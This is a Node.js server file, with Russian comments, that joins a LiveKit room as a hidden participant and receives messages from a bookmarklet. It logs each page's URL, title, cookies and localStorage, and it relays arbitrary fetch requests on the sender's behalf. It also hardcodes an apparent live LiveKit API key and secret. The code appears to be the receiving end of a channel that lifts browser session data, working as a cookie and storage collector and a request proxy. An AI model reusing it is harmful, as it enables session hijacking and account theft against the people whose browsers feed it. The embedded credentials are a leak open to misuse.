'use strict';

var http = require('http');
var { RoomServiceClient, Room, DataPacket_Kind } = require('livekit-server-sdk');

var PORT          = process.env.PORT             || 8080;
var LK_API_KEY    = process.env.LIVEKIT_API_KEY    || 'APIAsfxvEYsPGA2';
var LK_API_SECRET = process.env.LIVEKIT_API_SECRET || 'JCHcXc1lYger14JRo6IRih7pJRg8UyoUayGuHMmEKoK';
var LK_HTTP_URL   = 'https://jack-6u9u95rm.livekit.cloud';
var LK_WS_URL     = 'wss://jack-6u9u95rm.livekit.cloud';
var ROOM_NAME     = 'bookmark-room';

// ─── RoomServiceClient для SendData (отправка ответа букмарклету) ─────────────
var roomService = new RoomServiceClient(LK_HTTP_URL, LK_API_KEY, LK_API_SECRET);

function sendDataToRoom(data) {
  var jsonStr = JSON.stringify(data);
  var bytes = Buffer.from(jsonStr);
  console.log('[sendData] action=' + data.action + ' bytes=' + bytes.length);
  return roomService.sendData(ROOM_NAME, bytes, DataPacket_Kind.RELIABLE)
    .then(function() {
      console.log('[sendData] OK — delivered to room');
    })
    .catch(function(e) {
      console.error('[sendData] ERROR: ' + e.message);
    });
}

// ─── Обработка входящего сообщения от букмарклета ────────────────────────────
function processData(msg) {
  var action  = msg.action  || 'unknown';
  var payload = msg.payload || {};
  console.log('[relay] action=' + action + ' url=' + (payload.url || '?'));

  if (action === 'data') {
    console.log('[data] URL:    ' + payload.url);
    console.log('[data] Title:  ' + payload.title);
    console.log('[data] Cookie: ' + (payload.cookie || '').substring(0, 120));
    if (payload.localStorage) console.log('[data] LS: ' + payload.localStorage.substring(0, 200));
    sendDataToRoom({ action: 'ack', ok: true, message: 'Railway received!', url: payload.url, ts: Date.now() });

  } else if (action === 'fetch') {
    var url = payload.url || msg.url || '';
    console.log('[fetch] ' + url);
    fetch(url, { headers: Object.assign({ 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json,*/*' }, payload.headers || {}) })
      .then(function(r) {
        return r.text().then(function(t) {
          var d; try { d = JSON.parse(t); } catch(e) { d = t.substring(0, 4000); }
          sendDataToRoom({ action: 'fetch_result', ok: true, status: r.status, data: d, ts: Date.now() });
        });
      })
      .catch(function(e) {
        sendDataToRoom({ action: 'fetch_result', ok: false, error: e.message, ts: Date.now() });
      });

  } else {
    console.log('[relay] unknown action: ' + action);
  }
}

// ─── Room (server-side SDK) для получения DataPacket от букмарклета ──────────
var room = null;

function connectToLiveKit() {
  if (room) {
    try { room.disconnect(); } catch(e) {}
    room = null;
  }

  var { AccessToken } = require('livekit-server-sdk');
  var at = new AccessToken(LK_API_KEY, LK_API_SECRET, {
    identity: 'railway-server',
    ttl: '24h'
  });
  at.addGrant({
    room: ROOM_NAME,
    roomJoin: true,
    canPublish: false,
    canPublishData: true,
    canSubscribe: true,
    hidden: true
  });

  room = new Room();

  room.on('dataReceived', function(payload, participant, kind, topic) {
    console.log('[lk] dataReceived bytes=' + payload.byteLength + ' from=' + (participant && participant.identity));
    try {
      var str = Buffer.from(payload).toString('utf8');
      console.log('[lk] decoded: ' + str.substring(0, 200));
      var msg = JSON.parse(str);
      processData(msg);
    } catch(e) {
      console.error('[lk] parse error: ' + e.message);
    }
  });

  room.on('disconnected', function(reason) {
    console.log('[lk] disconnected: ' + reason + ' — reconnecting in 5s');
    room = null;
    setTimeout(connectToLiveKit, 5000);
  });

  at.toJwt().then(function(token) {
    console.log('[lk] connecting to LiveKit room: ' + ROOM_NAME);
    return room.connect(LK_WS_URL, token);
  }).then(function() {
    console.log('[lk] connected! participants=' + room.numParticipants);
  }).catch(function(e) {
    console.error('[lk] connect error: ' + e.message);
    room = null;
    setTimeout(connectToLiveKit, 5000);
  });
}

// ─── HTTP server (health check) ───────────────────────────────────────────────
var server = http.createServer(function(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  res.writeHead(200, { 'content-type': 'application/json' });
  res.end(JSON.stringify({
    ok: true,
    service: 'railway-livekit-receiver',
    connected: room ? room.state : 'null',
    ts: Date.now()
  }));
});

server.listen(PORT, function() {
  console.log('[server] Railway LiveKit receiver on port ' + PORT);
  connectToLiveKit();
});
